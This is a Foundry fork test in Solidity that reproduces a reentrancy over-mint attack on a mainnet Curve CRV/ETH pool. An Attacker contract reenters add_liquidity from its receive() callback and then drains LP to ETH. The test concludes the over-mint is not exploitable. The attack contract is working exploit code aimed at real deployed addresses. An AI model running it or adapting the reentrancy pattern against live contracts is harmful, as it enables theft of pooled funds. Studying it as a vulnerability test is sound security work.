// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {Test, console2} from "forge-std/Test.sol";

/// @title Curve CRV/ETH reentrancy over-mint test.
/// @author SmileNot9
/// @notice Reproduces the over-mint attack: deposits real liquidity
///         through add_liquidity, then triggers remove_liquidity_one_coin
///         (toward ETH) whose raw_call triggers the receive() callback to 
///         reenter add_liquidity and mint more LP. Isolates the LP minted
///         by an honest deposit and compares it against the LP minted by
///         the reentry.
///         Finding: the reentry works (guard is still broken) but mints no
///         more LP than an honest deposit, so the over-mint is not exploitable.
/// @dev    Fork test. The pool holds ETH natively, so the ETH-side raw_call during
///         withdrawal is what yields control and enables the reentry. 

interface ICurvePool {
    function coins(uint256 i) external view returns (address);
    function add_liquidity(uint256[2] calldata amounts, uint256 min_mint_amount, bool use_eth) external payable returns (uint256);
    function remove_liquidity_one_coin(uint256 token_amount, uint256 i, uint256 min_amount, bool use_eth) external returns (uint256);
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function totalSupply() external view returns (uint256);
}

contract CurveReentrancyOvermint is Test {
    /* Constants */
    address constant POOL = 0x8301AE4fc9c624d1D396cbDAa1ed877821D7C511;
    address constant LP_TOKEN = 0xEd4064f376cB8d68F770FB1Ff088a3d0F3FF5c4d;
    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant CRV = 0xD533a949740bb3306d119CC777fa900bA034cd52;

    /* Immutables */
    ICurvePool immutable pool = ICurvePool(POOL);
    
    /* Storage */
    Attacker attacker;

    function setUp() public {
        assertEq(pool.coins(0), WETH, "coins(0) != WETH");
        assertEq(pool.coins(1), CRV, "coins(1) != CRV");
        attacker = new Attacker(POOL, LP_TOKEN, CRV);
    }

    /// @notice Reproduces the over-mint attack: funds the attacker contract,
    ///         calls the attacker contract to start the attack and shows the results.
    function test_reentrancyOvermint() public {
        uint256 depEth = 1 ether;
        uint256 depCrv = 1e18;

        // Initial funding for the attacker contract
        vm.deal(address(attacker), depEth * 10 + 2 ether);
        deal(CRV, address(attacker), depCrv * 10);

        console2.log("=== INITIAL STATE ===");
        console2.log("Physical ETH in pool  :", POOL.balance);
        console2.log("LP total_supply       :", IERC20(LP_TOKEN).totalSupply());

        try attacker.attackOnce(depEth, depCrv) {
            // Sequence completed without reverting: measure the (would-be) over-mint
            console2.log("=== DIAGNOSTIC ===");
            console2.log("callback triggered          :", attacker.reentryFired());
            uint256 mintedByReentry = attacker.lpAfterReentry() - attacker.lpAfterInitialPostBurn();
            uint256 honestMint = attacker.lpAfterInitial();
            console2.log("LP minted by reentry        :", mintedByReentry);
            console2.log("LP minted by honest deposit :", honestMint);
            assertLe(mintedByReentry, honestMint, "unexpected over-mint");
            if (mintedByReentry > honestMint) {
                console2.log(">>> OVER-MINT: reentry minted more LP than an honest deposit.");
                console2.log(">>> excess:", mintedByReentry - honestMint);
            } else {
                console2.log(">>> Without over-mint: reentry LP <= honest deposit LP.");
            }
            // Drain only makes sense if the sequence completed (attacker actually holds LP).
            uint256 ethBeforeDrain = address(attacker).balance;
            attacker.drainToEth(2e18, 200_000);
            uint256 ethRecovered = address(attacker).balance - ethBeforeDrain;
            console2.log("=== ETH DRAINED ===");
            console2.log("ETH recovered from drain :", ethRecovered);
            console2.log("Total ETH deposited      :", depEth * 2);
            assertLt(ethRecovered, depEth * 2, "reentry attack should not be profitable");
        } catch Error(string memory reason) {
            // Curve's Loss guard reverts the whole detonator sequence
            console2.log("Attack sequence reverted. Reason:", reason);
            console2.log(">>> The reentrancy fires, but Curve's Loss guard reverts the full sequence.");
            assertEq(reason, "Loss", "expected the sequence to revert with Curve's Loss guard");
        }
    }
}

contract Attacker {
    /* Constants */
    uint256 constant NO_MIN_AMOUNT = 0; // Not safe in production.
    uint256 constant I_ETH = 0; // coin 0 = native ETH (registered as WETH in the pool)

    /* Immutables */
    address public immutable POOL;
    address public immutable LP;
    address public immutable CRV;

    /* Storage */
    ICurvePool pool;
    bool public reentryFired;
    bool internal reentered;
    uint256 internal depEthCached;
    uint256 internal depCrvCached;
    uint256 public lpAfterInitial; // LP after initial add_liquidity
    uint256 public lpAfterInitialPostBurn; // LP after the trigger burns (before reentry)
    uint256 public lpAfterReentry; // LP after the reentry add_liquidity
    
    constructor(address _pool, address _lp, address _crv) {
        POOL = _pool;
        LP = _lp;
        CRV = _crv;
        pool = ICurvePool(_pool);
    }

    receive() external payable {
        if (!reentered && msg.sender == POOL) {
            reentered = true;
            reentryFired = true;
            lpAfterInitialPostBurn = IERC20(LP).balanceOf(address(this));
            pool.add_liquidity{value: depEthCached}([depEthCached, depCrvCached], NO_MIN_AMOUNT, true);
            lpAfterReentry = IERC20(LP).balanceOf(address(this));
        }
    }

    /// @notice Starts the attack: deposits real liquidity, stores the honest LP amount,
    ///         and triggers remove_liquidity_one_coin to start the reentry.
    /// @param depEth Amount of ETH to deposit (native ETH)
    /// @param depCrv Amount of CRV to deposit
    function attackOnce(uint256 depEth, uint256 depCrv) external {
        depEthCached = depEth;
        depCrvCached = depCrv;
        IERC20(CRV).approve(POOL, type(uint256).max);

        uint256 lp0 = pool.add_liquidity{value: depEth}([depEth, depCrv], NO_MIN_AMOUNT, true);
        require(lp0 > 0, "initial add didn't mint LP");
        lpAfterInitial = IERC20(LP).balanceOf(address(this));

        // Trigger: burn a fraction toward ETH to trigger the receive() -> reentry
        uint256 trigger = lpAfterInitial / 4;
        pool.remove_liquidity_one_coin(trigger, I_ETH, NO_MIN_AMOUNT, true);
    }

    function drainToEth(uint256 step, uint256 maxIter) external {
        uint256 i = 0;
        while (i < maxIter) {
            uint256 held = IERC20(LP).balanceOf(address(this));
            if (held < step) break;
            try pool.remove_liquidity_one_coin(step, I_ETH, NO_MIN_AMOUNT, true) {
                i++;
            } catch {
                console2.log("remove_liquidity_one_coin REVERTS at iter:", i);
                break;
            }
        }
    }
}
